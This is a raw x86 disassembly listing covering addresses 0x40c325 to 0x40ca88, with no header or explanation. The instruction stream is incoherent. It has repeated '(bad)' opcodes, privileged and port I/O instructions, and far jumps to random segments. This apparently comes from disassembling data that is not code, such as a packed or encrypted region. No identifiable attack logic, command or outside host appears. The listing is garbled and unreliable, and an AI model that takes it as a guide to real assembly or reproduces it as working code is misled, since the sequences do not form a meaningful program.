  40c325:	jae    0x40c36d
  40c327:	and    BYTE PTR [esi-0x72b78d88],al
  40c32d:	mov    bl,0xf
  40c32f:	xchg   esi,eax
  40c330:	test   ebp,ecx
  40c332:	jno    0x40c390
  40c334:	imul   ebp,DWORD PTR [eax],0xffffffcd
  40c337:	ret    
  40c338:	and    DWORD PTR [edi+eax*2],ebx
  40c33b:	and    BYTE PTR [ebp-0x690c95da],ah
  40c341:	cmp    ebp,DWORD PTR [ecx-0x2c13b246]
  40c347:	push   0x5b
  40c349:	inc    ebx
  40c34a:	mov    WORD PTR [esi],?
  40c34c:	faddp  st(1),st
  40c34e:	cs daa 
  40c350:	dec    ecx
  40c351:	test   al,0x56
  40c353:	mov    eax,ds:0x50b77e22
  40c358:	cmp    DWORD PTR [ecx-0x20],0xb4648579
  40c35f:	mov    dh,0x16
  40c361:	call   FWORD PTR [esi+0x33725df2]
  40c367:	pmuludq mm5,QWORD PTR [edx+0x3]
  40c36b:	(bad)  
  40c36c:	fisttp QWORD PTR [ebx]
  40c36e:	(bad)  
  40c36f:	pushf  
  40c370:	pop    ebx
  40c371:	mov    bl,0xf6
  40c373:	mov    cl,0xea
  40c375:	ds push esi
  40c377:	jo     0x40c338
  40c379:	xor    edx,DWORD PTR [esi+0x1162c461]
  40c37f:	add    edi,ebx
  40c381:	or     dh,ch
  40c383:	sub    cl,BYTE PTR [edx-0x11]
  40c386:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c387:	adc    eax,0x2463f1e3
  40c38c:	xchg   ecx,eax
  40c38d:	aam    0xad
  40c38f:	mov    dl,BYTE PTR [esi-0x2984947]
  40c395:	add    esi,ecx
  40c397:	mulps  xmm0,xmm0
  40c39a:	pop    esp
  40c39b:	call   0xec70:0x5f2e2d6
  40c3a2:	xor    ecx,DWORD PTR [eax-0x7c000ead]
  40c3a8:	sub    esi,esi
  40c3aa:	neg    dl
  40c3ac:	pop    ecx
  40c3ae:	dec    ecx
  40c3af:	iret   
  40c3b0:	xor    dl,BYTE PTR [ecx+0x638ae486]
  40c3b6:	xchg   BYTE PTR [edi],ah
  40c3b8:	ins    DWORD PTR es:[edi],dx
  40c3b9:	cli    
  40c3ba:	sub    eax,0xca1c58d9
  40c3bf:	cmp    eax,0xa89c6279
  40c3c4:	je     0x40c430
  40c3c6:	out    0x3a,al
  40c3c8:	hlt    
  40c3c9:	pcmpgtd mm5,QWORD PTR [eax-0x239a48ae]
  40c3d0:	pop    esi
  40c3d1:	cmp    BYTE PTR [eax+0x4ce1247f],al
  40c3d7:	inc    esi
  40c3d8:	out    0xae,al
  40c3da:	call   DWORD PTR [eax]
  40c3dc:	mov    WORD PTR [eax-0x57],?
  40c3df:	cdq    
  40c3e0:	das    
  40c3e1:	rcr    BYTE PTR [ebp-0x59],1
  40c3e4:	retf   
  40c3e5:	pop    eax
  40c3e6:	inc    ebp
  40c3e7:	or     BYTE PTR ds:0xc8333741,dh
  40c3ed:	loop   0x40c407
  40c3ef:	nop
  40c3f0:	jmp    0x8472:0x96f1e3e
  40c3f7:	sub    al,0xad
  40c3f9:	push   edx
  40c3fa:	cmp    DWORD PTR [ebp-0x55885029],eax
  40c400:	mov    ds:0x82c4c27b,al
  40c405:	shl    BYTE PTR [eax],cl
  40c407:	push   ds
  40c408:	in     eax,0x47
  40c40a:	adc    esp,DWORD PTR [ebx-0x7c393a56]
  40c410:	push   edi
  40c411:	jmp    0x40c418
  40c413:	xchg   edi,eax
  40c414:	dec    ebx
  40c415:	call   0xd73c83d1
  40c41a:	mov    al,0x72
  40c41c:	dec    edx
  40c41d:	pop    esi
  40c41e:	dec    ebp
  40c41f:	cwde   
  40c420:	xchg   edx,eax
  40c421:	and    al,0x6c
  40c423:	sub    DWORD PTR [esi+ecx*1],ebx
  40c426:	stos   BYTE PTR es:[edi],al
  40c427:	(bad)  
  40c428:	rcl    esp,1
  40c42a:	std    
  40c42b:	retf   
  40c42c:	out    dx,al
  40c42d:	or     eax,0xbcde918
  40c432:	jbe    0x40c4a4
  40c434:	xchg   DWORD PTR [eax],ecx
  40c436:	clc    
  40c437:	or     DWORD PTR [ebx*1+0x45d60d54],edx
  40c43e:	cmp    eax,0xac05a8b5
  40c443:	in     al,0x5d
  40c445:	adc    edx,esp
  40c447:	or     al,0x8
  40c449:	jmp    0x64187b7
  40c44e:	xor    bh,cl
  40c450:	mov    eax,0x46da6f8d
  40c455:	push   ds
  40c456:	xchg   edx,eax
  40c457:	das    
  40c458:	mov    ds,ecx
  40c45a:	ins    BYTE PTR es:[edi],dx
  40c45b:	leave  
  40c45c:	mov    ebp,0xc15d337
  40c461:	pop    ebp
  40c462:	xchg   esi,eax
  40c463:	or     al,0x49
  40c465:	push   cs
  40c466:	mov    cl,0xf6
  40c468:	cmp    DWORD PTR [ecx-0x1e],esp
  40c46b:	cmp    al,0x92
  40c46d:	stos   DWORD PTR es:[edi],eax
  40c46e:	arpl   WORD PTR [eax-0x1f],bp
  40c471:	add    edx,ebp
  40c473:	sub    ecx,DWORD PTR [edi-0x57]
  40c476:	xchg   esp,eax
  40c478:	dec    esp
  40c479:	and    ecx,DWORD PTR [ecx]
  40c47b:	imul   ebp,DWORD PTR [edi+ebx*8],0x6df19a2c
  40c482:	mov    ecx,0x22d85d13
  40c487:	outs   dx,DWORD PTR ds:[esi]
  40c488:	cmp    DWORD PTR [edx+0x5d50e2fa],ebx
  40c48e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c48f:	sahf   
  40c490:	push   es
  40c491:	xor    BYTE PTR [edx],0x68
  40c494:	aaa    
  40c495:	and    al,0x9b
  40c497:	fwait
  40c498:	rol    BYTE PTR [ebp-0xe],cl
  40c49b:	bound  eax,QWORD PTR [ebx]
  40c49d:	or     esi,DWORD PTR [edx+0x3]
  40c4a0:	dec    ebx
  40c4a1:	inc    esp
  40c4a2:	addr16 enter 0x68b,0xa0
  40c4a7:	rcl    BYTE PTR [esi-0x5b],cl
  40c4aa:	dec    eax
  40c4ab:	and    DWORD PTR ds:0x57fb0c5d,esp
  40c4b1:	rcr    dl,0x8d
  40c4b4:	clc    
  40c4b5:	sbb    ah,BYTE PTR [ebp-0x5716bae8]
  40c4bb:	test   ebx,esi
  40c4bd:	pop    es
  40c4be:	test   ebp,edi
  40c4c0:	imul   esi,DWORD PTR [eax+0x317bc46a],0xffffffe8
  40c4c7:	push   0x97758cf0
  40c4cc:	jmp    0x40c471
  40c4ce:	stos   DWORD PTR es:[edi],eax
  40c4cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4d0:	adc    DWORD PTR [edx],ebp
  40c4d2:	popf   
  40c4d3:	fiadd  DWORD PTR [esp+edx*8+0x66]
  40c4d7:	sub    esi,ebp
  40c4d9:	fidivr DWORD PTR [eax-0x12cf47ea]
  40c4df:	mov    ah,0xe1
  40c4e1:	je     0x40c4d2
  40c4e3:	xchg   ecx,eax
  40c4e4:	dec    esp
  40c4e5:	outs   dx,DWORD PTR ds:[esi]
  40c4e6:	dec    esp
  40c4e7:	pop    ebp
  40c4e8:	and    eax,0xa5a1032b
  40c4ed:	mov    cl,0x98
  40c4ef:	or     eax,0xf6fda871
  40c4f4:	jmp    0x113dacf2
  40c4f9:	sub    eax,0x9e67c434
  40c4fe:	mov    ch,0xfe
  40c500:	enter  0x2ada,0x68
  40c504:	push   ss
  40c505:	mov    esp,ss
  40c507:	jns    0x40c51c
  40c509:	adc    ch,BYTE PTR [eax+0x2c02f9a5]
  40c50f:	(bad)
  40c514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c515:	das    
  40c516:	imul   ebx,DWORD PTR [ecx+0x415baaa5],0x0
  40c51d:	iret   
  40c51e:	mov    ebx,0xe1a78368
  40c523:	mov    edi,0xb3c40dd6
  40c528:	adc    ecx,DWORD PTR [ebx]
  40c52a:	ret    
  40c52b:	into   
  40c52c:	fldenv [esi]
  40c52e:	popa   
  40c52f:	(bad)  
  40c530:	xor    edi,ecx
  40c532:	inc    esi
  40c533:	xor    al,BYTE PTR [esi+0x34]
  40c536:	sub    BYTE PTR [eax+0x64],ah
  40c539:	(bad)  
  40c53b:	fcomp  QWORD PTR [esi-0x641ff65b]
  40c541:	imul   eax,DWORD PTR ds:0xf1ca64e0,0x2e8102e4
  40c54b:	xor    eax,0xa7c56087
  40c550:	scas   eax,DWORD PTR es:[edi]
  40c551:	cmp    dl,dh
  40c553:	lods   eax,DWORD PTR ds:[esi]
  40c554:	adc    esp,0x2db666d3
  40c55a:	xor    BYTE PTR [edi+0x23],bl
  40c55d:	lods   eax,DWORD PTR ds:[esi]
  40c55e:	pusha  
  40c55f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c560:	push   eax
  40c561:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c562:	fstp   st(1)
  40c564:	mov    al,0x24
  40c566:	xchg   ecx,eax
  40c567:	xor    ecx,DWORD PTR [edi+0x75]
  40c56a:	test   BYTE PTR [edx+0x38140aca],ch
  40c570:	jns    0x40c5bb
  40c572:	push   0xfbaf2ecd
  40c577:	pop    edx
  40c578:	cmp    bh,cl
  40c57a:	mov    BYTE PTR [edx+eiz*4-0x4e],bl
  40c57e:	xor    al,0xa5
  40c580:	ins    DWORD PTR es:[edi],dx
  40c581:	pushf  
  40c582:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c583:	stos   DWORD PTR es:[edi],eax
  40c584:	les    edx,FWORD PTR [ebx]
  40c586:	cs hlt 
  40c588:	cld    
  40c589:	(bad)  
  40c58a:	push   es
  40c58b:	call   0xbace7ba8
  40c590:	repnz mov BYTE PTR [ebp+0x52],cl
  40c594:	call   0xa184:0x601ba457
  40c59b:	pop    ebp
  40c59c:	rol    edx,cl
  40c59e:	push   edx
  40c59f:	loope  0x40c554
  40c5a1:	xchg   esi,eax
  40c5a2:	jecxz  0x40c56d
  40c5a4:	adc    al,0xa3
  40c5a6:	xchg   edi,eax
  40c5a7:	stos   BYTE PTR es:[edi],al
  40c5a8:	aam    0x88
  40c5aa:	loope  0x40c62b
  40c5ac:	mov    bh,0xa3
  40c5ae:	sti    
  40c5af:	sbb    al,0xd
  40c5b1:	sbb    BYTE PTR [edx+0x34],ah
  40c5b4:	xchg   esi,eax
  40c5b5:	(bad)  
  40c5b6:	in     al,0xa1
  40c5b8:	retf   
  40c5b9:	jo     0x40c61e
  40c5bb:	xchg   al,dh
  40c5bd:	(bad)  
  40c5bf:	pop    ecx
  40c5c0:	push   esi
  40c5c1:	in     al,0xc6
  40c5c3:	pop    ecx
  40c5c4:	scas   al,BYTE PTR es:[edi]
  40c5c5:	shr    bl,1
  40c5c7:	out    0x97,eax
  40c5c9:	or     eax,0x1cdd4a2d
  40c5ce:	in     al,dx
  40c5cf:	mov    esi,DWORD PTR [edx+0x1768258a]
  40c5d5:	call   0xe390bd55
  40c5da:	add    dl,BYTE PTR [edx]
  40c5dc:	fwait
  40c5dd:	pop    ebx
  40c5de:	scas   eax,DWORD PTR es:[edi]
  40c5df:	cmp    ebx,DWORD PTR [edx]
  40c5e1:	pop    edx
  40c5e2:	xor    dh,cl
  40c5e4:	aam    0x97
  40c5e6:	dec    edi
  40c5e7:	fwait
  40c5e8:	clc    
  40c5e9:	neg    BYTE PTR [ecx+0x2ac16721]
  40c5ef:	add    DWORD PTR [edi],0xffffff96
  40c5f2:	xchg   ebp,eax
  40c5f3:	xor    BYTE PTR [ecx+0x79385a41],bl
  40c5f9:	and    DWORD PTR [edx-0x5005076d],ebx
  40c5ff:	retf   0xe563
  40c602:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c603:	fsub   QWORD PTR [edi*8+0x6c5e2394]
  40c60a:	pop    eax
  40c60b:	div    BYTE PTR [edi+0x68]
  40c60e:	mov    eax,0x979bbb96
  40c613:	adc    ecx,DWORD PTR [edx]
  40c615:	and    dh,BYTE PTR [ecx]
  40c617:	mov    ebx,0xee024542
  40c61c:	jns    0x40c5a5
  40c61e:	mov    bl,0xc5
  40c620:	push   cs
  40c621:	mov    al,ds:0x1412252b
  40c626:	mov    bl,0x94
  40c628:	imul   eax,ecx,0xcb169f8a
  40c62e:	xchg   edx,eax
  40c62f:	test   BYTE PTR [ecx-0x2b],dh
  40c632:	xchg   ecx,eax
  40c634:	daa    
  40c635:	aas    
  40c636:	dec    ebp
  40c637:	pop    ss
  40c638:	int3   
  40c639:	hlt    
  40c63a:	adc    cl,BYTE PTR [edx-0x2b]
  40c63d:	int    0x1f
  40c63f:	arpl   WORD PTR [ebx+0xd455dde],bx
  40c645:	je     0x40c683
  40c647:	adc    ch,cl
  40c649:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c64a:	scas   al,BYTE PTR es:[edi]
  40c64b:	add    BYTE PTR [edx-0x3136bbf6],bl
  40c651:	mov    esi,0x9f7743eb
  40c656:	cwde   
  40c657:	and    esp,DWORD PTR [ebp+0x263e529f]
  40c65d:	cmp    cl,bl
  40c65f:	add    ah,BYTE PTR [edx+ecx*2+0x68]
  40c663:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c664:	fisubr WORD PTR [esi+esi*4]
  40c667:	test   cl,ah
  40c669:	xor    BYTE PTR [ebp+0xc],ah
  40c66c:	push   cs
  40c66d:	cmp    eax,0x1ee9cd1
  40c672:	or     eax,0xb9600a67
  40c677:	pop    esp
  40c678:	(bad)  
  40c679:	sub    edi,esp
  40c67b:	daa    
  40c67c:	or     al,0xd6
  40c67e:	data16 adc BYTE PTR [edi-0x24996193],0x61
  40c686:	pushf  
  40c687:	push   eax
  40c688:	cmc    
  40c689:	mov    al,0x70
  40c68b:	inc    esp
  40c68c:	jge    0x40c6d2
  40c68e:	pop    ecx
  40c68f:	push   edi
  40c690:	xor    eax,0x33a90b66
  40c696:	nop
  40c697:	inc    ebx
  40c698:	mov    al,ds:0xd611e919
  40c69d:	xor    bh,BYTE PTR [ebx+0x2e]
  40c6a0:	es push 0xffffffb5
  40c6a3:	mov    eax,0x7ff86ed8
  40c6a8:	enter  0x61f5,0xa3
  40c6ac:	adc    BYTE PTR [edx-0x68318efe],al
  40c6b2:	(bad)  
  40c6b4:	inc    esp
  40c6b5:	pop    ebx
  40c6b6:	ret    
  40c6b7:	outs   dx,BYTE PTR ds:[esi]
  40c6b8:	neg    DWORD PTR [eax]
  40c6ba:	popf   
  40c6bb:	jmp    0x3994:0x700143ac
  40c6c2:	icebp  
  40c6c3:	adc    DWORD PTR [ecx],ecx
  40c6c5:	outs   dx,DWORD PTR ds:[esi]
  40c6c6:	sbb    DWORD PTR [ecx-0x57],esp
  40c6c9:	jmp    0xe8ad:0xceb4189a
  40c6d0:	ss and ah,cl
  40c6d3:	stc    
  40c6d4:	jmp    esi
  40c6d6:	sti    
  40c6d7:	and    DWORD PTR [esi-0x47],ecx
  40c6da:	sub    cl,bh
  40c6dc:	add    edx,DWORD PTR [esi+ebx*8-0x2b]
  40c6e0:	mov    al,0x70
  40c6e2:	stos   DWORD PTR es:[edi],eax
  40c6e3:	mov    al,0x58
  40c6e5:	mov    ds:0xc0a0dd83,eax
  40c6ea:	sbb    dh,bh
  40c6ec:	popa   
  40c6ed:	lahf   
  40c6ee:	cmp    bh,BYTE PTR [ebx]
  40c6f0:	shr    DWORD PTR ds:0x8641c8a,0x21
  40c6f7:	mov    dh,BYTE PTR [esi]
  40c6f9:	cmp    bh,cl
  40c6fb:	arpl   WORD PTR [ecx+esi*8+0x76],dx
  40c6ff:	sahf   
  40c700:	retf   
  40c701:	imul   edx,DWORD PTR ds:0x59dc3205,0x6ba8d76
  40c70b:	lods   eax,DWORD PTR ds:[esi]
  40c70c:	gs xor esp,esp
  40c70f:	or     eax,0x13da5250
  40c714:	adc    ecx,esp
  40c716:	mov    dh,0x9e
  40c718:	nop
  40c719:	pop    ss
  40c71a:	pop    ebx
  40c71b:	retf   0xa064
  40c71e:	test   al,0x69
  40c720:	push   edx
  40c721:	add    al,0xbd
  40c723:	shl    BYTE PTR [eax+0x1692ab35],1
  40c729:	dec    eax
  40c72a:	xor    DWORD PTR [ecx+0x41f9379c],ebx
  40c730:	or     eax,ebp
  40c732:	lds    edx,FWORD PTR [ebp+0x47]
  40c735:	mov    esi,0x59e5e077
  40c73a:	pop    ebx
  40c73b:	fstp   DWORD PTR [esi-0x43]
  40c73e:	arpl   ax,sp
  40c740:	cdq    
  40c741:	scas   al,BYTE PTR es:[edi]
  40c742:	repz and esi,edx
  40c745:	and    dl,dh
  40c747:	outs   dx,BYTE PTR ds:[esi]
  40c748:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c749:	daa    
  40c74a:	sub    DWORD PTR [ebx+0x64],0xffffff8a
  40c74e:	adc    eax,0x21b89979
  40c753:	outs   dx,BYTE PTR ds:[esi]
  40c754:	clc    
  40c755:	mov    dl,0xf4
  40c757:	inc    esi
  40c758:	sub    ch,bh
  40c75a:	xchg   DWORD PTR [edi+0x40],esp
  40c75d:	ds aaa 
  40c75f:	mov    dh,0x61
  40c761:	test   DWORD PTR [edi+esi*2+0x58017a87],0xea533e42
  40c76c:	dec    eax
  40c76d:	fisttp DWORD PTR [ecx-0x10f901dd]
  40c773:	fs pop ss
  40c775:	xor    BYTE PTR [edx],al
  40c777:	jl     0x40c700
  40c779:	sbb    ecx,eax
  40c77b:	and    DWORD PTR [edx-0x63],edx
  40c77e:	mov    edx,DWORD PTR [ebp+0x4293c431]
  40c784:	hlt    
  40c785:	jecxz  0x40c75c
  40c787:	push   esp
  40c788:	adc    edx,DWORD PTR [eax-0x15]
  40c78b:	pop    es
  40c78c:	jo     0x40c712
  40c78e:	retf   
  40c78f:	mov    esi,0xe6b436cc
  40c794:	add    ch,BYTE PTR [esi]
  40c796:	ds icebp 
  40c798:	push   ss
  40c799:	fwait
  40c79a:	or     bl,BYTE PTR [esi]
  40c79c:	dec    ecx
  40c79d:	and    eax,ebp
  40c79f:	push   ss
  40c7a0:	fistp  WORD PTR [esi]
  40c7a2:	(bad)  
  40c7a3:	mov    edx,0x482b9ef9
  40c7a8:	sbb    ecx,DWORD PTR [esi]
  40c7aa:	dec    ebx
  40c7ab:	sub    esp,DWORD PTR [ebx]
  40c7ad:	add    BYTE PTR [edi],0xf2
  40c7b0:	push   ss
  40c7b1:	fwait
  40c7b2:	sbb    al,0x12
  40c7b4:	mul    ah
  40c7b6:	stos   BYTE PTR es:[edi],al
  40c7b7:	inc    edx
  40c7b8:	inc    ecx
  40c7b9:	pop    ecx
  40c7ba:	mov    ?,WORD PTR [ebx]
  40c7bc:	xor    al,0x3a
  40c7be:	lahf   
  40c7bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7c0:	pop    ss
  40c7c1:	pop    ds
  40c7c2:	pop    edx
  40c7c3:	ins    BYTE PTR es:[edi],dx
  40c7c4:	fcom   DWORD PTR [edi+ecx*8]
  40c7c7:	add    BYTE PTR [edx-0x39],dl
  40c7ca:	or     BYTE PTR [ecx-0x77],al
  40c7cd:	popa   
  40c7ce:	mov    bl,0x61
  40c7d0:	jne    0x40c7c9
  40c7d2:	or     DWORD PTR [edi-0x1b361967],0x12bc2e4
  40c7dc:	shl    BYTE PTR [ebx],0xd3
  40c7df:	lds    esi,FWORD PTR [edx+0x1d]
  40c7e2:	mov    al,ds:0x9b0a09e8
  40c7e7:	jne    0x40c7b4
  40c7e9:	cdq    
  40c7ea:	scas   eax,DWORD PTR es:[edi]
  40c7eb:	std    
  40c7ec:	adc    dl,BYTE PTR [ebp+ebp*8-0x48]
  40c7f0:	push   ebp
  40c7f1:	pushf  
  40c7f2:	outs   dx,BYTE PTR ds:[esi]
  40c7f3:	jl     0x40c7e9
  40c7f5:	mov    esi,0xc1f51102
  40c7fa:	sub    eax,0x73478ea9
  40c7ff:	vcvtss2sd xmm5,xmm7,DWORD PTR [esi+0x5233fce8]
  40c807:	mov    dh,0xcc
  40c809:	es mov bh,0x6a
  40c80c:	and    BYTE PTR [ebx],al
  40c80e:	pop    ebp
  40c80f:	les    esp,FWORD PTR [edx+eiz*2-0x77]
  40c813:	js     0x40c86a
  40c815:	mov    DWORD PTR [edi+eiz*1],edx
  40c818:	push   edi
  40c819:	and    dl,BYTE PTR [esi-0x7cc0e311]
  40c81f:	and    ecx,DWORD PTR [ebp-0x3f]
  40c822:	(bad)  
  40c823:	in     eax,0xd0
  40c825:	jp     0x40c800
  40c827:	or     ah,bl
  40c829:	mov    ebp,DWORD PTR [ecx+ebp*1+0xf]
  40c82d:	pop    es
  40c82e:	pusha  
  40c82f:	(bad)  
  40c830:	into   
  40c831:	mov    ds:0xc1983f84,eax
  40c836:	test   al,0x8a
  40c838:	push   esp
  40c839:	jbe    0x40c892
  40c83b:	or     eax,0xf28729a0
  40c840:	popa   
  40c841:	jae    0x40c8c1
  40c843:	test   al,0xe8
  40c845:	jns    0x40c806
  40c847:	dec    edi
  40c848:	pop    ebp
  40c849:	inc    esp
  40c84a:	or     eax,0x7fcf1f77
  40c84f:	ror    BYTE PTR [ebx+0x57],cl
  40c852:	jnp    0x40c858
  40c854:	xor    esp,DWORD PTR [edi+ebx*2]
  40c857:	inc    edi
  40c858:	fucomp st(5)
  40c85a:	sub    DWORD PTR [edi],esp
  40c85c:	out    0xf0,al
  40c85e:	aad    0x66
  40c860:	fist   WORD PTR ds:0x4f3ef4b5
  40c866:	out    0x8f,eax
  40c868:	imul   esi,DWORD PTR [ebx],0xe3f97130
  40c86e:	(bad)  
  40c86f:	pusha  
  40c870:	std    
  40c871:	push   ss
  40c872:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c873:	mov    ecx,0xa5ea417d
  40c878:	loop   0x40c872
  40c87a:	inc    ebp
  40c87b:	jne    0x40c815
  40c87d:	xchg   esi,eax
  40c87e:	add    DWORD PTR [ecx+0x51],ebp
  40c881:	cdq    
  40c882:	(bad)  
  40c883:	in     eax,dx
  40c884:	pop    esi
  40c885:	adc    eax,0xcea37002
  40c88a:	mov    ch,0x5b
  40c88c:	fwait
  40c88d:	clc    
  40c88e:	cmp    ch,bl
  40c890:	pop    eax
  40c891:	inc    ebp
  40c892:	add    DWORD PTR [edx],ebx
  40c894:	mov    ds:0x9956c76b,al
  40c899:	(bad)  
  40c89a:	(bad)  
  40c89b:	jbe    0x40c87c
  40c89d:	mov    eax,ds:0x4b7ec77a
  40c8a2:	std    
  40c8a3:	imul   edx,ebp,0x56a44f70
  40c8a9:	inc    edx
  40c8aa:	es out dx,eax
  40c8ac:	pop    edx
  40c8ad:	mov    esp,DWORD PTR [ebx]
  40c8af:	mov    bh,0xe8
  40c8b1:	mov    BYTE PTR es:[esi-0x7bf72eb1],dh
  40c8b8:	fild   WORD PTR [ebx+0x14]
  40c8bb:	xchg   ebx,eax
  40c8bc:	push   ebx
  40c8bd:	fld    QWORD PTR [edx]
  40c8bf:	jmp    0x38bd77c1
  40c8c4:	mov    cr2,ebx
  40c8c7:	test   ch,al
  40c8c9:	adc    al,0xae
  40c8cb:	cs push 0x711bf7d1
  40c8d1:	repnz pop edi
  40c8d3:	lock mov cl,0x77
  40c8d6:	or     DWORD PTR [esi-0x13],ebx
  40c8d9:	mov    ds:0xb8d869b5,al
  40c8de:	(bad)  
  40c8df:	out    0x68,eax
  40c8e1:	mov    ch,0x1
  40c8e3:	jle    0x40c89e
  40c8e5:	cdq    
  40c8e6:	(bad)  
  40c8e7:	and    dh,BYTE PTR [edi+0xa]
  40c8ea:	repnz cmp BYTE PTR ds:0xc82703c2,dl
  40c8f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8f2:	mov    bl,0x40
  40c8f4:	and    edx,eax
  40c8f6:	mov    ss,WORD PTR [edx+0x218a1e96]
  40c8fc:	sub    cl,cl
  40c8fe:	movnti DWORD PTR [eax],esp
  40c901:	imul   ebx,DWORD PTR [ecx-0x1b075b23],0xb586076
  40c90b:	sbb    ah,BYTE PTR [edi+0x53]
  40c90e:	gs jno 0x40c971
  40c911:	sub    BYTE PTR [edx+0x23f3f309],bh
  40c917:	call   0x5e36:0xc6788e76
  40c91e:	cmp    eax,0xa0eba256
  40c923:	push   es
  40c924:	sbb    al,0x8
  40c926:	in     eax,dx
  40c927:	clc    
  40c928:	icebp  
  40c929:	jecxz  0x40c965
  40c92b:	mov    esi,0x9628714c
  40c930:	fcomp  st(1)
  40c932:	es push esp
  40c934:	lahf   
  40c935:	and    BYTE PTR [edx+0x7d87b305],0x73
  40c93c:	mov    ebx,0xcac0fbc3
  40c941:	inc    edx
  40c942:	test   BYTE PTR [esi],ah
  40c944:	mov    edi,0x8fb5ac0
  40c949:	mov    ebp,0x2df008d2
  40c94e:	lock cli 
  40c950:	jmp    0x1807:0x1fc2d6e9
  40c957:	dec    esp
  40c958:	mov    al,0xd6
  40c95a:	in     eax,dx
  40c95b:	imul   esp,DWORD PTR [edi+edx*2-0x62],0xffffff96
  40c960:	jns    0x40c97f
  40c962:	cmp    al,0xe5
  40c964:	and    al,0x26
  40c966:	jne    0x40c94d
  40c968:	pop    es
  40c969:	or     cl,ah
  40c96b:	pop    es
  40c96c:	mov    ah,BYTE PTR [edi]
  40c96e:	push   0xffffffa1
  40c970:	iret   
  40c971:	pop    esi
  40c972:	add    edx,DWORD PTR [ecx]
  40c974:	pop    es
  40c975:	dec    edi
  40c976:	iret   
  40c977:	test   eax,0x9ce38af1
  40c97c:	(bad)  
  40c97d:	cs sbb al,0x47
  40c980:	jmp    0x69da:0x4fbcb346
  40c987:	sbb    DWORD PTR [ebp+0x50],edi
  40c98a:	inc    esi
  40c98b:	xchg   DWORD PTR [ecx-0x3cd32d8e],ecx
  40c991:	cmp    bl,BYTE PTR [eax]
  40c993:	dec    ecx
  40c994:	add    esi,DWORD PTR [ecx-0x29]
  40c997:	test   DWORD PTR [ebp-0x3b],0x762a068d
  40c99e:	push   ebx
  40c99f:	xor    eax,0x74fdde77
  40c9a4:	pop    es
  40c9a5:	or     eax,0xb31c8af4
  40c9aa:	int    0xef
  40c9ac:	mov    DWORD PTR [edx],edx
  40c9ae:	lods   eax,DWORD PTR ds:[esi]
  40c9af:	push   edi
  40c9b0:	adc    ah,al
  40c9b2:	ficomp DWORD PTR [edi+ebx*2]
  40c9b5:	aad    0x56
  40c9b7:	test   BYTE PTR [edi-0x21ee0628],al
  40c9bd:	mov    al,ds:0xdadcc2b4
  40c9c2:	xchg   ebx,eax
  40c9c3:	sti    
  40c9c4:	bound  esp,QWORD PTR [ebx+ecx*1+0x0]
  40c9c8:	lods   eax,DWORD PTR ds:[esi]
  40c9c9:	mov    al,ds:0x3bef044e
  40c9ce:	je     0x40c97e
  40c9d0:	pop    ecx
  40c9d1:	lock mov dh,0x49
  40c9d4:	xchg   ebp,eax
  40c9d5:	push   ecx
  40c9d6:	ror    BYTE PTR ds:0xa0e8496d,1
  40c9dc:	out    0xf2,eax
  40c9de:	imul   ebp,eax,0xffffffe1
  40c9e1:	nop
  40c9e2:	inc    ecx
  40c9e3:	mov    cl,0x1d
  40c9e5:	push   ebp
  40c9e6:	stos   BYTE PTR es:[edi],al
  40c9e7:	sbb    al,0x9b
  40c9e9:	cmp    edi,DWORD PTR [esi+0x39]
  40c9ec:	gs xchg ebp,eax
  40c9ee:	mov    BYTE PTR [ecx-0x45],bl
  40c9f1:	out    0x9f,al
  40c9f3:	mov    al,ds:0x9e88e225
  40c9f8:	pop    es
  40c9f9:	lods   eax,DWORD PTR ds:[esi]
  40c9fa:	push   ecx
  40c9fb:	jnp    0x40c99a
  40c9fd:	jmp    0x40c9a0
  40c9ff:	jne    0x40ca6a
  40ca01:	scas   al,BYTE PTR es:[edi]
  40ca02:	push   esp
  40ca03:	not    DWORD PTR [ebp+0x617d95c0]
  40ca09:	fdivr  QWORD PTR [edx-0x68eceb9a]
  40ca0f:	ret    0x3506
  40ca12:	outs   dx,BYTE PTR ds:[esi]
  40ca13:	mov    al,0x3
  40ca15:	push   edx
  40ca16:	add    BYTE PTR [ebx-0x6e],0xce
  40ca1a:	idiv   DWORD PTR ds:0xa837ae00
  40ca20:	enter  0xdea3,0x5c
  40ca24:	pop    ebx
  40ca25:	out    dx,al
  40ca26:	popf   
  40ca27:	and    BYTE PTR [eax],bl
  40ca29:	fwait
  40ca2a:	rdseed eax
  40ca2d:	or     eax,0x7aeb3691
  40ca32:	in     eax,0x94
  40ca34:	dec    ecx
  40ca35:	js     0x40c9f6
  40ca37:	(bad)  [eax+0x3f]
  40ca3a:	inc    esi
  40ca3b:	mov    ds:0x9ed482d3,eax
  40ca40:	outs   dx,DWORD PTR ds:[esi]
  40ca41:	xor    edx,DWORD PTR [eax+ecx*4-0x6]
  40ca45:	es in  al,0x88
  40ca48:	xchg   edx,eax
  40ca49:	ins    BYTE PTR es:[edi],dx
  40ca4a:	fiadd  DWORD PTR es:[ecx+0x7eb1497e]
  40ca51:	es cmc 
  40ca53:	aaa    
  40ca54:	or     BYTE PTR ds:0xc0571e99,dh
  40ca5a:	mov    bl,al
  40ca5c:	loop   0x40ca2d
  40ca5e:	data16 mov fs,WORD PTR [ebp-0x4dc91016]
  40ca65:	jb     0x40cac4
  40ca67:	jbe    0x40cad3
  40ca69:	hlt    
  40ca6a:	mov    dl,0xe3
  40ca6c:	add    BYTE PTR [eax],ch
  40ca6e:	push   0xa861e177
  40ca73:	sbb    al,bl
  40ca75:	lds    ecx,FWORD PTR [ebp+ebp*2-0x39f11b65]
  40ca7c:	icebp  
  40ca7d:	xchg   ebp,eax
  40ca7e:	or     eax,0x7ad11756
  40ca83:	test   BYTE PTR [edx+0x3e],0x57
  40ca87:	dec    ebp
  40ca88:	call   0x98de47ec
